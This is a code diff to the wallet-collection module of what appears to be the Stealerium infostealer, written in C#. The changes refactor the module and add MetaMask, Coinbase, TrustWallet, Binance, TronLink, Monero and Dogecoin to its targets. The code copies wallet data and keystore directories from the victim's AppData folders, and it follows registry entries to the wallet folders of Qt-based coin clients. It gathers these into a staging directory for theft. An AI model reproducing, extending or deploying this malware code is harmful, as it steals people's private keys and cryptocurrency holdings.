@@ -8,79 +8,114 @@ namespace Stealerium.Target
 {
     internal sealed class Wallets
     {
-        // Wallets list directories
-        private static readonly List<string[]> SWalletsDirectories = new List<string[]>
+        // Helper methods to get paths for AppData and LocalAppData
+        private static string GetAppDataPath(string subDir)
         {
-            new[] { "Zcash", Paths.Appdata + "\\Zcash" },
-            new[] { "Armory", Paths.Appdata + "\\Armory" },
-            new[] { "Bytecoin", Paths.Appdata + "\\bytecoin" },
-            new[] { "Jaxx", Paths.Appdata + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb" },
-            new[] { "Exodus", Paths.Appdata + "\\Exodus\\exodus.wallet" },
-            new[] { "Ethereum", Paths.Appdata + "\\Ethereum\\keystore" },
-            new[] { "Electrum", Paths.Appdata + "\\Electrum\\wallets" },
-            new[] { "AtomicWallet", Paths.Appdata + "\\atomic\\Local Storage\\leveldb" },
-            new[] { "Guarda", Paths.Appdata + "\\Guarda\\Local Storage\\leveldb" },
-            new[] { "Coinomi", Paths.Lappdata + "\\Coinomi\\Coinomi\\wallets" }
+            return Path.Combine(Paths.Appdata, subDir);
+        }
+
+        private static string GetLocalAppDataPath(string subDir)
+        {
+            return Path.Combine(Paths.Lappdata, subDir);
+        }
+
+        // Wallet directories list
+        private static readonly List<string[]> KnownWalletDirectories = new List<string[]>
+        {
+            new[] { "Zcash", GetAppDataPath("Zcash") },
+            new[] { "Armory", GetAppDataPath("Armory") },
+            new[] { "Bytecoin", GetAppDataPath("bytecoin") },
+            new[] { "Jaxx", GetAppDataPath("com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb") },
+            new[] { "Exodus", GetAppDataPath("Exodus\\exodus.wallet") },
+            new[] { "Ethereum", GetAppDataPath("Ethereum\\keystore") },
+            new[] { "Electrum", GetAppDataPath("Electrum\\wallets") },
+            new[] { "AtomicWallet", GetAppDataPath("atomic\\Local Storage\\leveldb") },
+            new[] { "Guarda", GetAppDataPath("Guarda\\Local Storage\\leveldb") },
+            new[] { "Coinomi", GetLocalAppDataPath("Coinomi\\Coinomi\\wallets") },
+            new[] { "Binance", GetAppDataPath("Binance") },
+            new[] { "Coinbase", GetLocalAppDataPath("Coinbase") },
+            new[] { "TronLink", GetAppDataPath("TronLink\\Local Storage\\leveldb") },
+            new[] { "MetaMask", GetLocalAppDataPath("MetaMask\\IndexedDB\\file__0.indexeddb.leveldb") },
+            new[] { "TrustWallet", GetAppDataPath("TrustWallet\\Local Storage\\leveldb") }
         };
 
         // Wallets list from registry
-        private static readonly string[] SWalletsRegistry =
+        private static readonly string[] KnownWalletsInRegistry =
         {
             "Litecoin",
             "Dash",
-            "Bitcoin"
+            "Bitcoin",
+            "Monero",
+            "Dogecoin"
         };
 
-        // Write wallet.dat
-        public static void GetWallets(string sSaveDir)
+        // Collect wallets and write to the specified directory
+        public static void GetWallets(string saveDir)
         {
             try
             {
-                Directory.CreateDirectory(sSaveDir);
+                Directory.CreateDirectory(saveDir);
 
-                foreach (var wallet in SWalletsDirectories)
-                    CopyWalletFromDirectoryTo(sSaveDir, wallet[1], wallet[0]);
-
-                foreach (var wallet in SWalletsRegistry)
-                    CopyWalletFromRegistryTo(sSaveDir, wallet);
-
-                if (Counter.Wallets == 0)
-                    Filemanager.RecursiveDelete(sSaveDir);
-            }
-            catch (Exception ex)
-            {
-                Logging.Log("Wallets >> Failed collect wallets\n" + ex);
-            }
-        }
-
-        // Copy wallet files to directory
-        private static void CopyWalletFromDirectoryTo(string sSaveDir, string sWalletDir, string sWalletName)
-        {
-            var sdir = Path.Combine(sSaveDir, sWalletName);
-            if (!Directory.Exists(sWalletDir)) return;
-            Filemanager.CopyDirectory(sWalletDir, sdir);
-            Counter.Wallets++;
-        }
-
-        // Copy wallet from registry to directory
-        private static void CopyWalletFromRegistryTo(string sSaveDir, string sWalletRegistry)
-        {
-            var sdir = Path.Combine(sSaveDir, sWalletRegistry);
-            try
-            {
-                using (var registryKey = Registry.CurrentUser.OpenSubKey("Software")?.OpenSubKey(sWalletRegistry)
-                           ?.OpenSubKey($"{sWalletRegistry}-Qt"))
+                // Collect wallets from known directories
+                foreach (var wallet in KnownWalletDirectories)
                 {
-                    if (registryKey == null) return;
-                    var cdir = registryKey.GetValue("strDataDir") + "\\wallets";
-                    if (!Directory.Exists(cdir)) return;
-                    Filemanager.CopyDirectory(cdir, sdir);
-                    Counter.Wallets++;
+                    CopyWalletFromDirectoryTo(saveDir, wallet[1], wallet[0]);
+                }
+
+                // Collect wallets from registry entries
+                foreach (var wallet in KnownWalletsInRegistry)
+                {
+                    CopyWalletFromRegistryTo(saveDir, wallet);
+                }
+
+                // If no wallets found, delete the save directory
+                if (Counter.Wallets == 0)
+                {
+                    Filemanager.RecursiveDelete(saveDir);
                 }
             }
             catch (Exception ex)
             {
-                Logging.Log("Wallets >> Failed to collect wallet from registry\n" + ex);
+                Logging.Log($"Wallets >> Failed to collect wallets\n{ex}");
+            }
+        }
+
+        // Copy wallet files from directory to the specified save directory
+        private static void CopyWalletFromDirectoryTo(string saveDir, string walletDir, string walletName)
+        {
+            if (!Directory.Exists(walletDir)) return;
+
+            var destinationDir = Path.Combine(saveDir, walletName);
+            Filemanager.CopyDirectory(walletDir, destinationDir);
+            Counter.Wallets++;
+
+            Logging.Log($"Wallets >> Successfully copied wallet files for {walletName}");
+        }
+
+        // Copy wallet data from registry to the specified save directory
+        private static void CopyWalletFromRegistryTo(string saveDir, string walletRegistry)
+        {
+            var destinationDir = Path.Combine(saveDir, walletRegistry);
+
+            try
+            {
+                using (var registryKey = Registry.CurrentUser.OpenSubKey("Software")?.OpenSubKey(walletRegistry)?.OpenSubKey($"{walletRegistry}-Qt"))
+                {
+                    if (registryKey == null) return;
+
+                    var walletDir = registryKey.GetValue("strDataDir")?.ToString();
+                    if (string.IsNullOrEmpty(walletDir) || !Directory.Exists(walletDir)) return;
+
+                    var sourceDir = Path.Combine(walletDir, "wallets");
+                    Filemanager.CopyDirectory(sourceDir, destinationDir);
+                    Counter.Wallets++;
+
+                    Logging.Log($"Wallets >> Successfully copied {walletRegistry} wallet from registry");
+                }
+            }
+            catch (Exception ex)
+            {
+                Logging.Log($"Wallets >> Failed to collect wallet from registry for {walletRegistry}\n{ex}");
             }
         }
     }
